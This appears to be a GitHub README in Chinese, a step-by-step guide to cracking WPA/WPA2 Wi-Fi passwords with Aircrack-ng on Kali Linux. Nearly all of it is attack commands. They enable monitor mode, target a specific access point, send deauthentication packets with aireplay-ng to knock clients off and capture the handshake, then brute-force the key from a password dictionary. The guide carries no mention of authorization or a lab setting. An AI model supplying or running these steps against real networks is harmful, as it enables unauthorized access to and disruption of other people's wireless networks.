# Crack wifi Password
使用Aircrack-ng暴力破解WPA/WPA2加密wifi密碼。
* 暴力破解
* 字典檔

## **環境&工具**
* 系統：Kali Linux
* 硬體：一台有無線網卡的電腦
* 一個字典檔

## **破解流程**
* step1：查看無線網卡名稱
  ```shell
  ifconfig
  ```
* step2：將網卡設定為monitor模式
  ```shell
  airmon-ng start 網卡名稱
  ```
  > ![image](https://github.com/WanShannn/Crack-WIFI-Password/blob/main/result/2.png)
* step3：搜尋目前位置所有 AP 站台
  ```shell
  airodump-ng 網卡監聽後的名稱
  ```
  > ![image](https://github.com/WanShannn/Crack-WIFI-Password/blob/main/result/3.png)
* step4：使用`airodump-ng`開始收集封包，並將封包存在指定的目錄下
  ```shell
  airodump-ng -c 頻道 --bssid 目標AP的bssid -w 檔名 監聽網卡的名稱
  ```
  > ![image](https://github.com/WanShannn/Crack-WIFI-Password/blob/main/result/4.png)
* step5：使用`aireplay-ng`傳送假信號讓AP與Client之間進行互動，進而抓取中間的封包(需另外開視窗動作，收集封包不能斷)
  ```shell
  aireplay-ng -0 發送阻斷封包的數量 -a 目標AP的bssid -c 特定連線主機的bssid 監聽網卡的名稱
  ```
  > ![image](https://github.com/WanShannn/Crack-WIFI-Password/blob/main/result/5.png)
* step6：收集到 handshake
  > ![image](https://github.com/WanShannn/Crack-WIFI-Password/blob/main/result/6.png)
* step7：使用`aircrack-ng`進行解密，(必須要擁有密碼字典檔)
  ```shell
  aircrack-ng -b 目標AP的bssid -w 密碼字典檔 使用airodump-ng收集到的arp封包
  ```
  > ![image](https://github.com/WanShannn/Crack-WIFI-Password/blob/main/result/7-1.png)
  > ![image](https://github.com/WanShannn/Crack-WIFI-Password/blob/main/result/7-2.png)
  
## **References**
* https://shazi.info/%E4%BD%BF%E7%94%A8-aircrack-ng-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3-wpawpa2-%E5%8A%A0%E5%AF%86-wifi-%E5%AF%86%E7%A2%BC/
* https://zh.wikipedia.org/zh-tw/Aircrack-NG
